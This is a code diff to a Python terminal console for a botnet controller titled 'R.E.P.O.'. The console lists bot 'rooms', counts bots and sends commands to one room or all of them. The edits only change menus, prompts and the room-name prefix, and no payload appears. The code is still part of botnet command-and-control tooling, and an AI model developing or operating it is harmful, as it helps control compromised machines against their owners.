@@ -12,6 +12,7 @@ class BotnetGUI:
     def __init__(self, controller: BotnetController):
         self.controller = controller
         self.console = Console()
+        self.commandroom_prefix = "cmd_"
         
     def print_ascii_title(self):
         ascii_title = pyfiglet.figlet_format("R.E.P.O.", font="slant")
@@ -21,7 +22,9 @@ class BotnetGUI:
         try:
             self.console.clear()
             self.console.print(Align.center(Panel("[bold green]Send Command[/]", expand=True)))
-            command = Prompt.ask("[bold cyan]Enter the command to send[/]")
+            command = Prompt.ask("[bold cyan]Enter the command to send (or press Enter to return)[/]")
+            if command == "":
+                return
             send_to_all = Confirm.ask("[bold yellow]Send to all rooms?[/]")
             
             if send_to_all:
@@ -46,11 +49,14 @@ class BotnetGUI:
             table.add_column("Bot Count", justify="center", style="bold magenta")
             
             for idx, (_, room) in enumerate(room_list):
-                table.add_row(str(idx + 1), room.room.name[4:], str(len(room.bots)))
+                table.add_row(str(idx + 1), room.room.name[len(self.commandroom_prefix):], str(len(room.bots)))
             
             self.console.print(Align.center(table))
             
-            room_nr = int(Prompt.ask("[bold white]Enter room number[/]", choices=[str(i + 1) for i in range(len(room_list))]))
+            room_nr = Prompt.ask("[bold white]Enter room number (or press Enter to return)[/]", choices=[str(i + 1) for i in range(len(room_list))] + [""])
+            if room_nr == "":
+                return
+            room_nr = int(room_nr)
             _, room = room_list[room_nr - 1]
             return room
         except ValueError:
@@ -88,16 +94,16 @@ class BotnetGUI:
             for _, room in room_list:
                 bot_count = len(room.bots)
                 total_bots += bot_count
-                table.add_row(room.room.name[4:], str(bot_count))
+                table.add_row(room.room.name[len(self.commandroom_prefix):], str(bot_count))
             
             self.console.print(Align.center(table))
             self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")
 
-            room_names = [room.room.name[4:] for _, room in room_list]
-            # room_name = Prompt.ask("[bold white]Enter the room name to view bots (or press Enter to return)", choices=room_names + [""])
+            room_names = [room.room.name[len(self.commandroom_prefix):] for _, room in room_list]
+            room_name = Prompt.ask("[bold white]Enter the room name to view bots (or press Enter to return)", choices=room_names + [""])
             
             if room_name != "":
-                room_name =  "cmd_" + room_name
+                room_name =  self.commandroom_prefix + room_name
                 selected_room = [room for _, room in room_list if room.room.name == room_name][0]
                 self.show_bot_status_in_room(selected_room)
             else:
@@ -110,7 +116,9 @@ class BotnetGUI:
         try:
             self.console.clear()
             self.console.print(Align.center(Panel("[bold green]Create Room[/]", expand=True)))
-            room_name = Prompt.ask("[bold yellow]Enter room name[/]").replace(" ", "_")
+            room_name = Prompt.ask("[bold yellow]Enter room name (or press Enter to return)[/]").replace(" ", "_")
+            if room_name == "":
+                return
             self.controller.add_command_room(room_name)
             self.console.print("[bold green]Room created successfully![/]")
         except Exception as e:
